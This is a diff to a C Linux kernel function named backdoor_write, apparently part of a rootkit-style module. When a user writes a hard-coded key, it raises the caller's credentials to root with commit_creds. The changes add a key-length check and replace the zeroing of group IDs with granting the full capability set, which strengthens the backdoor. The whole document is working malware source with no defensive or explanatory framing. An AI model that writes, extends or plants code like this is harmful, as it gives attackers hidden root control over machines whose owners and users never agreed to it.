@@ -42,7 +42,11 @@ ssize_t backdoor_write(
         char key[] = "qwertyytrewq\0";
         char* buf;
         struct cred* creds;
+        size_t key_len = 14;
         ssize_t result = 0;
+
+        if (key_len != count)
+                return count;
 
         buf = kvmalloc(count, GFP_KERNEL);
 
@@ -54,7 +58,7 @@ ssize_t backdoor_write(
                 goto out;
         }
 
-        if (strncmp(key, buf, count) == 0) {
+        if (strcmp(key, buf) == 0) {
                 result = count;
                 goto out;
         }
@@ -69,10 +73,9 @@ ssize_t backdoor_write(
         creds->suid.val = 0;
         creds->euid.val = 0;
         creds->fsuid.val = 0;
-        creds->gid.val = 0;
-        creds->sgid.val = 0;
-        creds->fsgid.val = 0;
-        creds->egid.val = 0;
+        creds->cap_permitted = CAP_FULL_SET;
+        creds->cap_effective = CAP_FULL_SET;
+        creds->cap_inheritable = CAP_FULL_SET;
 
         commit_creds(creds);
         result = count;
